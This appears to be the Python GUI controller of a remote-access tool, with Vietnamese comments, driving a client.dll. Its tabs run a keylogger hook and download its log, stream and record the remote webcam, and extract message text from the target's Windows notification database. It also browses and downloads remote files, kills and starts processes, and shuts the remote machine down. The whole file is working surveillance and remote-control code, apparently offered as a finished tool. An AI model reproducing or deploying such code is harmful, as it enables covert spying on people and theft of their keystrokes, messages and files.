import re
import sqlite3
import xml.etree.ElementTree as ET # Để đọc nội dung tin nhắn XML
import customtkinter as ctk
from tkinter import ttk, messagebox, filedialog
from PIL import Image, ImageTk, ImageFile
import ctypes
import os
import threading
import time
import sys
import cv2  # pip install opencv-python

# Cấu hình xử lý ảnh lỗi để không bị crash khi stream
ImageFile.LOAD_TRUNCATED_IMAGES = True
ctk.set_appearance_mode("Dark")

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
DLL_PATH = os.path.join(CURRENT_DIR, "client.dll")

# --- LOAD THƯ VIỆN DLL C++ ---
try:
    clib = ctypes.CDLL(DLL_PATH)
    clib.DownloadFile.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
    clib.ConnectToServer.argtypes = [ctypes.c_char_p, ctypes.c_int] 
    clib.ConnectToServer.restype = ctypes.c_bool
    clib.SendStringCmd.argtypes = [ctypes.c_char_p]
    clib.KillProcess.argtypes = [ctypes.c_char_p]
    clib.StartProcess.argtypes = [ctypes.c_char_p]
    clib.InitWinsock()
    clib.GetDrives.argtypes = []
    clib.ExplorePath.argtypes = [ctypes.c_char_p]
    clib.GetNotificationHistory.argtypes = []
except Exception as e:
    messagebox.showerror("Lỗi", f"Lỗi DLL: {e}")
    sys.exit()

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Remote Control Ultimate - Video Recorder")
        self.geometry("1100x750")
        
        
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- MENU BÊN TRÁI ---
        self.sidebar = ctk.CTkFrame(self, width=200, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        
        ctk.CTkLabel(self.sidebar, text="CONTROL PANEL", font=("Arial", 20, "bold")).pack(pady=20)
        
        # Ô nhập IP
        self.entry_ip = ctk.CTkEntry(self.sidebar, placeholder_text="IP Server")
        self.entry_ip.insert(0, "127.0.0.1")
        self.entry_ip.pack(pady=5, padx=10)

        # --- THÊM Ô NHẬP PORT Ở ĐÂY ---
        self.entry_port = ctk.CTkEntry(self.sidebar, placeholder_text="Port (5656)")
        self.entry_port.insert(0, "5656") # Mặc định là 5656
        self.entry_port.pack(pady=5, padx=10)
        # ------------------------------
        
        self.btn_conn = ctk.CTkButton(self.sidebar, text="KẾT NỐI", fg_color="green", command=self.connect)
        self.btn_conn.pack(pady=5, padx=10)
        ctk.CTkButton(self.sidebar, text="NGẮT KẾT NỐI", fg_color="gray", command=self.disconnect).pack(pady=5, padx=10)
        ctk.CTkButton(self.sidebar, text="☠ TẮT MÁY SERVER", fg_color="darkred", command=self.shutdown_sv).pack(pady=(50, 5), padx=10)

        self.log_box = ctk.CTkTextbox(self.sidebar)
        self.log_box.pack(pady=20, padx=10, fill="both", expand=True)

        # --- TABS NỘI DUNG ---
        self.tabs = ctk.CTkTabview(self)
        self.tabs.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        
        self.tab_proc = self.tabs.add("Tiến trình")
        self.tab_webcam = self.tabs.add("Webcam Recorder") # Tab Webcam xịn
        self.tab_key = self.tabs.add("Keylogger")
        self.tab_files = self.tabs.add("File Manager")
        
        self.tab_noti = self.tabs.add("Lịch sử Thông Báo")
        
        self.setup_noti_tab()
        self.setup_proc_tab()
        self.setup_webcam_tab()
        self.setup_key_tab()
        self.setup_file_tab()

    def log(self, msg):
        self.log_box.insert("end", f"> {msg}\n"); self.log_box.see("end")

    def connect(self):
        # 1. Lấy IP (Nếu rỗng thì gán mặc định)
        ip_str = self.entry_ip.get().strip()
        if not ip_str: 
            ip_str = "127.0.0.1"
        
        # 2. Lấy Port (Nếu rỗng thì gán 5656)
        port_str = self.entry_port.get().strip()
        if not port_str:
            port = 5656
        else:
            try:
                port = int(port_str)
            except:
                messagebox.showerror("Lỗi", "Port phải là số nguyên!")
                return

        self.log(f"Đang kết nối tới {ip_str}:{port}...")
        self.btn_conn.configure(state="disabled")

        def task():
            # Gọi hàm C++ mới với 2 tham số
            success = clib.ConnectToServer(ip_str.encode('utf-8'), port)
            
            if success:
                self.log(f"✅ KẾT NỐI THÀNH CÔNG ({ip_str}:{port})")
                self.btn_conn.configure(fg_color="gray", text="Đã kết nối")
            else:
                self.log("❌ KẾT NỐI THẤT BẠI!")
                self.btn_conn.configure(fg_color="green", state="normal", text="KẾT NỐI")

        threading.Thread(target=task).start()

    def disconnect(self):
        clib.CloseConnection()
        self.log("Đã ngắt.")

    def shutdown_sv(self):
        if messagebox.askyesno("Cảnh báo", "Tắt máy Server?"):
            clib.ShutdownServer()
    # ==========================
    #   TAB THÔNG BÁO (NOTIFICATION)
    # ==========================
    def setup_noti_tab(self):
        fr = ctk.CTkFrame(self.tab_noti); fr.pack(fill="x", padx=5, pady=5)
        
        ctk.CTkButton(fr, text="Tải Lịch Sử Thông Báo", command=self.load_notifications, fg_color="purple").pack(side="left", padx=5)
        self.lbl_noti_status = ctk.CTkLabel(fr, text="...", text_color="gray"); self.lbl_noti_status.pack(side="left", padx=10)

        # Bảng hiển thị
        cols = ("App", "Thời gian", "Nội dung")
        self.tree_noti = ttk.Treeview(self.tab_noti, columns=cols, show="headings", height=20)
        self.tree_noti.heading("App", text="Ứng dụng"); self.tree_noti.column("App", width=150)
        self.tree_noti.heading("Thời gian", text="Thời gian"); self.tree_noti.column("Thời gian", width=150)
        self.tree_noti.heading("Nội dung", text="Nội dung Tin nhắn/Thông báo"); self.tree_noti.column("Nội dung", width=500)
        self.tree_noti.pack(fill="both", expand=True, padx=5, pady=5)

    def load_notifications(self):
        self.lbl_noti_status.configure(text="Đang tải Database từ Server...")
        for i in self.tree_noti.get_children(): self.tree_noti.delete(i)
        
        def task():
            if os.path.exists("history.db"): os.remove("history.db")
            
            # 1. Gọi C++ tải file DB về
            clib.GetNotificationHistory()
            time.sleep(1)
            
            if os.path.exists("history.db"):
                self.lbl_noti_status.configure(text="Đang giải mã dữ liệu...")
                try:
                    # 2. Kết nối SQLite và truy vấn
                    conn = sqlite3.connect("history.db")
                    cursor = conn.cursor()
                    
                    # Lệnh SQL để lấy App Name, Thời gian, và Nội dung XML
                    # (Cấu trúc bảng Notification có thể khác nhau tùy bản Win, đây là query chung nhất)
                    query = """
                        SELECT 
                            HandlerId, 
                            ArrivalTime, 
                            Payload 
                        FROM Notification 
                        WHERE Payload IS NOT NULL
                        ORDER BY ArrivalTime DESC 
                        LIMIT 500
                    """
                    cursor.execute(query)
                    rows = cursor.fetchall()
                    
                    data_list = []
                    for row in rows:
                        app_id = str(row[0])
                        raw_time = row[1]
                        payload = row[2] # Dữ liệu thô
                        
                        # 1. Xử lý thời gian
                        try:
                            timestamp = (raw_time - 116444736000000000) / 10000000
                            time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
                        except: time_str = "Unknown"

                        # 2. Xử lý Nội dung (NÂNG CẤP MẠNH MẼ)
                        content_text = ""
                        if payload:
                            try:
                                # Decode UTF-8, bỏ qua lỗi
                                xml_str = payload.decode('utf-8', errors='ignore')
                                
                                # Cách 1: Dùng Regex "Vét cạn" (Tìm tất cả chữ nằm giữa dấu > và <)
                                # Đây là cách hiệu quả nhất để lấy text bất chấp cấu trúc XML lạ
                                matches = re.findall(r'>([^<]+)<', xml_str)
                                
                                # Lọc bỏ các khoảng trắng thừa và ký tự rác
                                clean_texts = [m.strip() for m in matches if m.strip()]
                                
                                if clean_texts:
                                    content_text = " | ".join(clean_texts)
                                else:
                                    # 2. Nếu Regex thất bại, lấy TOÀN BỘ ký tự đọc được (ASCII printable)
                                    # Kỹ thuật này giúp lấy được text kể cả khi cấu trúc XML bị vỡ
                                    clean_chars = "".join([c for c in xml_str if c.isprintable()])
                                    # Lọc bớt các đoạn mã loằng ngoằng
                                    if len(clean_chars) > 5: 
                                        content_text = "[RAW] " + clean_chars[:200] # Lấy 200 ký tự đầu
                            except:
                                content_text = "(Lỗi giải mã)"
                        
                        # Nếu vẫn rỗng thì ghi chú
                        if not content_text: content_text = "[Thông báo hệ thống / Không có nội dung]"

                        # 3. Làm đẹp tên App (Giữ nguyên)
                        if "Microsoft.Skybe" in app_id: app_name = "Skype"
                        elif "Zalo" in app_id: app_name = "Zalo"
                        elif "Chrome" in app_id: app_name = "Google Chrome"
                        elif "Explorer" in app_id: app_name = "Windows System"
                        else: 
                            # Lấy phần tên cuối cùng cho gọn
                            parts = app_id.split('.')
                            app_name = parts[-1] if len(parts) > 0 else app_id

                        data_list.append((app_name, time_str, content_text))

                    conn.close()

                    # 3. Update UI
                    def update():
                        for item in data_list:
                            self.tree_noti.insert("", "end", values=item)
                        self.lbl_noti_status.configure(text=f"Đã trích xuất {len(data_list)} thông báo mới nhất.")
                    self.after(0, update)

                except Exception as e:
                    print(e)
                    self.after(0, lambda: self.lbl_noti_status.configure(text="Lỗi đọc Database (Khác phiên bản Win?)"))
            else:
                self.after(0, lambda: self.lbl_noti_status.configure(text="Lỗi: Không tải được file DB."))

        threading.Thread(target=task).start()
        
    # ==========================================
    #   TAB WEBCAM (QUAN TRỌNG - ĐÃ SỬA LỖI)
    # ==========================================
    def setup_webcam_tab(self):
        ctl = ctk.CTkFrame(self.tab_webcam)
        ctl.pack(fill="x", padx=5, pady=5)
        
        # Nút Bật/Tắt Webcam
        self.btn_web_st = ctk.CTkButton(ctl, text="Bật Webcam", command=self.toggle_webcam)
        self.btn_web_st.pack(side="left", padx=5)
        
        # Nút Ghi Video
        self.btn_web_rec = ctk.CTkButton(ctl, text="🔴 Ghi Video (.avi)", fg_color="gray", state="disabled", command=self.toggle_web_rec)
        self.btn_web_rec.pack(side="left", padx=5)
        
        # Màn hình hiển thị
        self.lbl_web = ctk.CTkLabel(self.tab_webcam, text="[MÀN HÌNH ĐEN]", fg_color="black")
        self.lbl_web.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Bấm đúp để mở file video vừa quay
        self.lbl_web.bind("<Double-Button-1>", lambda e: os.startfile("webcam_record.avi") if os.path.exists("webcam_record.avi") else None)

        self.web_st = False   # Trạng thái đang xem
        self.web_rc = False   # Trạng thái đang ghi
        self.web_wr = None    # Biến ghi video (OpenCV VideoWriter)

    def toggle_webcam(self):
        if not self.web_st:
            # --- BẮT ĐẦU XEM ---
            self.web_st = True
            self.btn_web_st.configure(text="Tắt Webcam", fg_color="red")
            self.btn_web_rec.configure(state="normal", fg_color="#1f538d") # Cho phép ghi
            
            # Gọi C++ chạy ngầm để tải ảnh về file webcam.jpg liên tục
            threading.Thread(target=clib.ReceiveWebcamStream, daemon=True).start()
            
            # Bắt đầu vòng lặp cập nhật giao diện Python
            self.update_webcam_ui()
        else:
            # --- TẮT WEBCAM ---
            self.web_st = False
            self.web_rc = False # Dừng ghi nếu đang ghi
            
            # Lưu và đóng file video nếu có
            if self.web_wr: 
                self.web_wr.release()
                self.web_wr = None
                self.log("Đã lưu file video.")

            clib.SendStringCmd(b"STOP") # Gửi lệnh dừng cho Server
            self.btn_web_st.configure(text="Bật Webcam", fg_color="#1f538d")
            self.btn_web_rec.configure(state="disabled", text="🔴 Ghi Video (.avi)", fg_color="gray")

    def toggle_web_rec(self):
        if not self.web_rc:
            # Bắt đầu ghi
            self.web_rc = True
            self.btn_web_rec.configure(text="■ Dừng Ghi", fg_color="red")
            self.log("Đang ghi hình vào 'webcam_record.avi'...")
        else:
            # Dừng ghi
            self.web_rc = False
            if self.web_wr: 
                self.web_wr.release()
                self.web_wr = None
            self.btn_web_rec.configure(text="🔴 Ghi Video (.avi)", fg_color="#1f538d")
            self.log("Đã dừng ghi. File đã được lưu!")

    def update_webcam_ui(self):
        if not self.web_st: return
        
        path = "webcam.jpg"
        if os.path.exists(path):
            try:
                # Dùng OpenCV đọc ảnh (để lấy kích thước chuẩn)
                frame = cv2.imread(path)
                
                if frame is not None:
                    # 1. XỬ LÝ GHI VIDEO (NẾU ĐANG BẬT REC)
                    if self.web_rc:
                        if self.web_wr is None:
                            # Khởi tạo file video lần đầu tiên
                            h, w, _ = frame.shape
                            # Tạo file video AVI, tốc độ 10 khung hình/giây
                            self.web_wr = cv2.VideoWriter("webcam_record.avi", cv2.VideoWriter_fourcc(*'MJPG'), 10, (w, h))
                        
                        # Ghi frame hiện tại vào video
                        self.web_wr.write(frame)

                    # 2. XỬ LÝ HIỂN THỊ (RESIZE CHO VỪA MÀN HÌNH APP)
                    # Chuyển màu từ BGR (OpenCV) sang RGB (Pillow)
                    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img_pil = Image.fromarray(rgb_frame)
                    
                    # Tính toán kích thước hiển thị
                    w_win = self.lbl_web.winfo_width()
                    if w_win > 10:
                        # Giữ tỉ lệ khung hình (Webcam thường là 4:3 hoặc 16:9)
                        h_orig, w_orig, _ = frame.shape
                        ratio = h_orig / w_orig
                        h_new = int(w_win * ratio)
                        
                        ctk_img = ctk.CTkImage(light_image=img_pil, size=(w_win, h_new))
                        self.lbl_web.configure(image=ctk_img, text="")
            except:
                pass # Bỏ qua frame lỗi (do C++ đang ghi dở)
        
        # Gọi lại sau 50ms (khoảng 20 FPS)
        self.after(50, self.update_webcam_ui)

    def setup_file_tab(self):
        # Thanh địa chỉ và nút điều hướng
        nav_frame = ctk.CTkFrame(self.tab_files)
        nav_frame.pack(fill="x", padx=5, pady=5)

        ctk.CTkButton(nav_frame, text="⬅ Back", width=60, command=self.go_back).pack(side="left", padx=2)
        ctk.CTkButton(nav_frame, text="🏠 Drives", width=60, command=self.load_drives).pack(side="left", padx=2)
        
        ctk.CTkButton(nav_frame, text="⬇ Tải Xuống", width=80, fg_color="#1f538d", command=self.download_file).pack(side="left", padx=10)
        
        self.lbl_path = ctk.CTkEntry(nav_frame)
        
        self.lbl_path.pack(side="left", fill="x", expand=True, padx=5)
        self.lbl_path.insert(0, "My Computer")
        self.lbl_path.configure(state="readonly")

        # Bảng dữ liệu File
        cols = ("Name", "Type", "Size")
        self.tree_file = ttk.Treeview(self.tab_files, columns=cols, show="headings", height=20)
        self.tree_file.heading("Name", text="Tên File / Thư mục")
        self.tree_file.heading("Type", text="Loại")
        self.tree_file.heading("Size", text="Kích thước (Bytes)")
        
        self.tree_file.column("Name", width=400)
        self.tree_file.column("Type", width=100)
        self.tree_file.column("Size", width=150)
        self.tree_file.pack(fill="both", expand=True, padx=5, pady=5)

        # Sự kiện Double Click để mở thư mục
        self.tree_file.bind("<Double-1>", self.on_file_double_click)
        
        self.current_path = "" # Lưu đường dẫn hiện tại
        
    # --- LOGIC XỬ LÝ FILE ---
    def load_drives(self):
        self.log("Đang lấy danh sách ổ đĩa...")
        self.current_path = "" # Reset về gốc
        self.lbl_path.configure(state="normal"); self.lbl_path.delete(0, "end"); self.lbl_path.insert(0, "My Computer"); self.lbl_path.configure(state="readonly")
        
        for i in self.tree_file.get_children(): self.tree_file.delete(i)

        def task():
            if os.path.exists("explorer.txt"): os.remove("explorer.txt")
            clib.GetDrives()
            time.sleep(0.5)
            self.update_file_ui()
        threading.Thread(target=task).start()

    def load_path(self, path):
        self.log(f"Đang mở: {path}")
        self.current_path = path
        self.lbl_path.configure(state="normal"); self.lbl_path.delete(0, "end"); self.lbl_path.insert(0, path); self.lbl_path.configure(state="readonly")
        
        for i in self.tree_file.get_children(): self.tree_file.delete(i)

        def task():
            if os.path.exists("explorer.txt"): os.remove("explorer.txt")
            clib.ExplorePath(path.encode('utf-8'))
            time.sleep(0.5)
            self.update_file_ui()
        threading.Thread(target=task).start()

    def update_file_ui(self):
        if os.path.exists("explorer.txt"):
            with open("explorer.txt", "r", encoding="utf-8", errors="ignore") as f: 
                lines = f.readlines()
            
            def ui():
                for line in lines:
                    parts = line.strip().split('|')
                    if len(parts) >= 3:
                        # Thêm icon (giả lập bằng text)
                        icon = "📁 " if parts[1] == "FOLDER" or parts[1] == "DRIVE" else "📄 "
                        self.tree_file.insert("", "end", values=(icon + parts[0], parts[1], parts[2]))
                self.log("Đã tải xong danh sách file.")
            self.after(0, ui)

    def download_file(self):
        # 1. Kiểm tra xem có chọn file nào chưa
        selection = self.tree_file.selection()
        if not selection:
            messagebox.showwarning("Chú ý", "Vui lòng chọn một FILE để tải.")
            return

        item = self.tree_file.item(selection[0], "values")
        name = item[0].replace("📁 ", "").replace("📄 ", "")
        type_ = item[1]

        # Chỉ cho tải FILE, không cho tải FOLDER (vì chưa xử lý zip)
        if type_ != "FILE":
            messagebox.showwarning("Chú ý", "Chỉ hỗ trợ tải File. Với Folder hãy mở vào trong.")
            return

        # 2. Đường dẫn trên Server
        # Ghép đường dẫn hiện tại với tên file
        remote_path = os.path.join(self.current_path, name)
        # Fix đường dẫn Windows
        remote_path = remote_path.replace("/", "\\")

        # 3. Hỏi người dùng lưu vào đâu trên máy mình (Save Dialog)
        local_path = filedialog.asksaveasfilename(initialfile=name, title="Lưu file tại...")
        
        if local_path:
            self.log(f"Đang tải: {name} ... Vui lòng chờ.")
            
            # 4. Gọi C++ chạy ngầm (để không đơ giao diện)
            def task():
                clib.DownloadFile(remote_path.encode('utf-8'), local_path.encode('utf-8'))
                
                # Kiểm tra kết quả
                if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
                    self.log(f"✅ Tải thành công: {local_path}")
                    messagebox.showinfo("Thành công", f"Đã tải xong:\n{local_path}")
                else:
                    self.log("❌ Tải thất bại (File rỗng hoặc lỗi mạng).")
                    
            threading.Thread(target=task).start()
            
    def on_file_double_click(self, event):
        # 1. Lấy danh sách các dòng đang chọn
        selection = self.tree_file.selection()
        
        # 2. KIỂM TRA: Nếu không chọn dòng nào (click vùng trắng) -> Thoát ngay
        if not selection:
            return 

        # 3. Nếu có chọn thì mới xử lý tiếp
        item_id = selection[0]
        item = self.tree_file.item(item_id, "values")
        
        if not item: return # Phòng trường hợp item rỗng

        name = item[0].replace("📁 ", "").replace("📄 ", "") # Bỏ icon
        type_ = item[1]

        if type_ == "DRIVE":
            # Nếu click ổ đĩa (C:\)
            self.load_path(name)
        elif type_ == "FOLDER":
            # Nếu click folder -> Ghép chuỗi đường dẫn
            new_path = os.path.join(self.current_path, name)
            # Fix lỗi đường dẫn Windows (đôi khi os.path.join dùng / thay vì \)
            new_path = new_path.replace("/", "\\") 
            if not new_path.endswith("\\"): new_path += "\\"
            self.load_path(new_path)
        else:
            self.log(f"Đây là file: {name}. (Chưa hỗ trợ tải về)")

    def go_back(self):
        if self.current_path == "" or len(self.current_path) <= 3:
            self.load_drives() # Quay về danh sách ổ đĩa
        else:
            parent = os.path.dirname(self.current_path.rstrip("\\"))
            if not parent.endswith("\\"): parent += "\\"
            self.load_path(parent)

    # --- TAB TIẾN TRÌNH & KEYLOG GIỮ NGUYÊN ---
    def setup_proc_tab(self):
        # Chia đôi màn hình (Trên/Dưới)
        self.paned = ttk.PanedWindow(self.tab_proc, orient="vertical")
        self.paned.pack(fill="both", expand=True, padx=5, pady=5)

        # --- PHẦN 1: ĐANG CHẠY (RUNNING) ---
        self.frame_top = ctk.CTkFrame(self.paned)
        self.paned.add(self.frame_top, weight=1)
        
        ctk.CTkLabel(self.frame_top, text="🔥 ỨNG DỤNG ĐANG CHẠY (Chọn để KILL)", text_color="orange", font=("Arial", 14, "bold")).pack(pady=5)
        
        fr_top_btn = ctk.CTkFrame(self.frame_top)
        fr_top_btn.pack(fill="x", padx=5)
        ctk.CTkButton(fr_top_btn, text="Làm mới DS Đang Chạy", command=lambda: self.load_list(True)).pack(side="left", padx=5)
        self.btn_kill = ctk.CTkButton(fr_top_btn, text="DIỆT (KILL)", fg_color="red", state="disabled", command=self.kill_proc)
        self.btn_kill.pack(side="right", padx=5)

        # Bảng Running
        self.tree_run = ttk.Treeview(self.frame_top, columns=("ID", "Name", "Th"), show="headings", height=10)
        self.tree_run.heading("ID", text="ID"); self.tree_run.column("ID", width=60)
        self.tree_run.heading("Name", text="Tên Tiến Trình"); self.tree_run.column("Name", width=300)
        self.tree_run.heading("Th", text="Threads"); self.tree_run.column("Th", width=60)
        self.tree_run.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Sự kiện chọn dòng Running
        self.tree_run.bind("<ButtonRelease-1>", self.on_click_running)

        # --- PHẦN 2: ĐÃ CÀI ĐẶT (INSTALLED) ---
        self.frame_bot = ctk.CTkFrame(self.paned)
        self.paned.add(self.frame_bot, weight=1)

        ctk.CTkLabel(self.frame_bot, text="🚀 ỨNG DỤNG CÓ SẴN (Chọn để START)", text_color="#1f538d", font=("Arial", 14, "bold")).pack(pady=5)

        fr_bot_btn = ctk.CTkFrame(self.frame_bot)
        fr_bot_btn.pack(fill="x", padx=5)
        ctk.CTkButton(fr_bot_btn, text="Lấy DS Ứng Dụng", command=self.load_installed_apps).pack(side="left", padx=5)
        self.btn_start = ctk.CTkButton(fr_bot_btn, text="KHỞI ĐỘNG (START)", fg_color="green", state="disabled", command=self.start_app)
        self.btn_start.pack(side="right", padx=5)

        # Bảng Installed
        self.tree_inst = ttk.Treeview(self.frame_bot, columns=("Name"), show="headings", height=10)
        self.tree_inst.heading("Name", text="Tên Ứng Dụng (Start Menu)")
        self.tree_inst.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Sự kiện chọn dòng Installed
        self.tree_inst.bind("<ButtonRelease-1>", self.on_click_installed)

        # Biến lưu tạm
        self.selected_pid = None
        self.selected_app_name = None
    
    def on_click_running(self, event):
        sel = self.tree_run.selection()
        if sel:
            item = self.tree_run.item(sel[0], "values")
            self.selected_pid = item[0]
            self.btn_kill.configure(state="normal", text=f"Diệt ID: {self.selected_pid}")
        else:
            self.btn_kill.configure(state="disabled", text="DIỆT (KILL)")

    def on_click_installed(self, event):
        sel = self.tree_inst.selection()
        if sel:
            item = self.tree_inst.item(sel[0], "values")
            self.selected_app_name = item[0]
            self.btn_start.configure(state="normal", text=f"Mở: {self.selected_app_name}")
        else:
            self.btn_start.configure(state="disabled", text="KHỞI ĐỘNG (START)")
        
    def load_list(self, is_app): # Load danh sách đang chạy
        self.log("Đang tải Process đang chạy...")
        for i in self.tree_run.get_children(): self.tree_run.delete(i)
        
        def task():
            if os.path.exists("apps.txt"): os.remove("apps.txt")
            clib.GetAppList()
            time.sleep(1)
            if os.path.exists("apps.txt"):
                with open("apps.txt", "r", errors="ignore") as f:
                    for line in f:
                        p = line.strip().split('|')
                        if len(p)>=3: self.tree_run.insert("", "end", values=(p[0], p[1], p[2]))
                self.log("Tải xong Running processes.")
        threading.Thread(target=task).start()
        
    def load_installed_apps(self): # Load danh sách đã cài
        self.log("Đang quét Start Menu...")
        for i in self.tree_inst.get_children(): self.tree_inst.delete(i)
        
        def task():
            if os.path.exists("installed.txt"): os.remove("installed.txt")
            clib.GetInstalledApps() # Hàm C++ mới
            time.sleep(0.5)
            if os.path.exists("installed.txt"):
                with open("installed.txt", "r", encoding="utf-8", errors="ignore") as f: # Đọc UTF-8
                    for line in f:
                        name = line.strip()
                        if name: self.tree_inst.insert("", "end", values=(name,))
                self.log("Tải xong danh sách Ứng dụng.")
        threading.Thread(target=task).start()

    def kill_proc(self):
        if self.selected_pid:
            self.log(f"Đang diệt PID: {self.selected_pid}")
            threading.Thread(target=lambda: clib.KillProcess(self.selected_pid.encode('utf-8'))).start()

    def start_app(self):
        if self.selected_app_name:
            self.log(f"Đang mở: {self.selected_app_name}")
            # Gọi hàm StartProcess với tên ứng dụng (Server sẽ tự tìm shortcut để mở)
            threading.Thread(target=lambda: clib.StartProcess(self.selected_app_name.encode('utf-8'))).start()
            
    def setup_key_tab(self):
        fr = ctk.CTkFrame(self.tab_key); fr.pack(fill="x", padx=5, pady=5)
        ctk.CTkButton(fr, text="Bắt đầu Ghi (Hook)", fg_color="green", command=lambda: threading.Thread(target=clib.HookKeylog).start() or self.log("Bật Hook")).pack(side="left", padx=5)
        ctk.CTkButton(fr, text="Dừng Ghi (Unhook)", fg_color="gray", command=lambda: threading.Thread(target=clib.UnhookKeylog).start() or self.log("Tắt Hook")).pack(side="left", padx=5)
        ctk.CTkButton(fr, text="Tải Keylog", fg_color="#1f538d", command=self.load_keylog).pack(side="left", padx=20)
        self.txt_key = ctk.CTkTextbox(self.tab_key, font=("Consolas", 14)); self.txt_key.pack(fill="both", expand=True, padx=5, pady=5)

    def load_keylog(self):
        def task():
            if os.path.exists("keylog.txt"): os.remove("keylog.txt")
            clib.GetKeylog()
            time.sleep(1)
            if os.path.exists("keylog.txt"):
                with open("keylog.txt", "r", errors="ignore") as f: self.txt_key.delete("1.0", "end"); self.txt_key.insert("end", f.read())
        threading.Thread(target=task).start()

    def on_close(self):
        self.web_st = False; 
        if self.web_wr: self.web_wr.release()
        clib.CloseConnection(); self.destroy(); sys.exit()

if __name__ == "__main__":
    app = App()
    app.protocol("WM_DELETE_WINDOW", app.on_close)
    app.mainloop()